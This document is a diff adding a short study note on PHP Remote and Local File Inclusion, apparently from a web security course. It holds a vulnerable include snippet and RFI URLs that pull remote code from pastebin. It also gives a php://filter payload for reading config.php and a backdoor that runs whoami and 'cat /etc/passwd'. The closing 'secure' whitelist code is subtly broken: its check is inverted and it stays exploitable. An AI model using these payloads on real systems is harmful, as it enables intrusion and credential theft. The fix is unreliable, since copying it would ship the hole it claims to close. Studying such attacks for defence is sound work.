@@ -1,0 +1,60 @@
+- VULN : RFI (Remote File Inclusion) :
+php.ini :
+allow_url_include = Off (default)
+allow_url_include = On
+
+if (isset($_GET['page'])) 
+{   
+    include $_GET['page']; 
+} 
+
+RFI :
+https://pastebin.com/
+https://pastebin.com/raw/GLDUFzev
+
+http://localhost/RFI/index.php?page=https://pastebin.com/raw/GLDUFzev
+
+https://www.base64decode.org/
+http://localhost/web_security/lfi/index.php?page=php://filter/convert.base64-encode/resource=config.php
+
+- simple backdoor :
+<pre>
+<?php
+echo system('dir c:\*.*');
+echo system('ls -la');
+echo system('whoami');
+echo system('cat /etc/passwd');
+?>
+</pre>
+
+http://localhost/RFI/index.php?page=https://pastebin.com/raw/dRrPktZa 
+
+- Secure Coding Practices :
+1. Disable allow_url_include in php.ini
+2. Use absolute path instead of relative path
+3. Use whitelist instead of blacklist
+pages/
+    - pages1.php
+    - pages2.php
+    - pages3.php
+
+<?php
+$whiteList = array(
+    'page1',
+    'page2',
+    'page3'
+);
+
+if (isset($_GET['page'])) {
+
+    if (!in_array($_GET['page'], $whiteList)) {
+        include "pages/" . ($_GET['page']) . ".php";
+        // echo "Page not found";
+    } else {
+        die("Page not found");
+    }
+} else {
+    echo "<p>Ini halaman Depan</p>";
+}
+
+?>
